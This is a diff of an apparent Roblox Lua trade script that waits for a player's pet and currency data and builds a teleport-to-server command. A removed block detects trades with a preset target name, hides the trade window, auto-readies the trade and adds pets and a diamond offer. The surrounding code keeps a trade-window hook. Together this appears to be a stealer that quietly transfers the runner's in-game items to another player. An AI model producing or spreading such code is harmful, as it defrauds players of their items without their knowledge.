@@ -100,9 +100,10 @@ local function AddWhitelistedPets()
 
     -- Wait until pet data is loaded
     repeat
-        task.wait()
-    until ClientDataManager.Data and ClientDataManager.Data.Pets
-
+    task.wait()
+until ClientDataManager.Data
+    and ClientDataManager.Data.Pets
+    and ClientDataManager.Data.Currency
     local added = 0
 
     for petID, petData in pairs(ClientDataManager.Data.Pets) do
@@ -171,6 +172,9 @@ local function GetTeleportScript()
     return string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", placeId, jobId)
 end
 
+local TradeFrame = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame
+local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade
+
 TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
     if not TradeGui.Visible then
         return
@@ -227,29 +231,6 @@ local function rt()
         ReplicatedStorage.Events.UIAction:FireServer("ReadyTrade")
     end
 end
-
-local TradeFrame = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame
-local TradeGui = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade
-TradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
-    if TradeGui.Visible then
-        -- Check if the person we are trading is the correct target
-        local tradeFrame = LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.Frame
-        if tradeFrame and string.find(string.lower(tradeFrame.OtherInventory.Title.Text), string.lower(getgenv().UName)) then
-            if getgenv().here then
-                if getgenv().aol then
-                    TradeFrame.Visible = true
-                    game:GetService("Players").LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.BKG.Visible = true
-                else
-                    TradeFrame.Visible = false
-                    game:GetService("Players").LocalPlayer.PlayerGui.MainGui.OtherFrames.Trade.BKG.Visible = false
-                    task.spawn(rt)
-                    AddWhitelistedPets()
-                    ModifyDiamondOffer(Diamonds)
-                end
-            end
-        end
-    end
-end)
 
 local function StartTrade()
     wait(9)
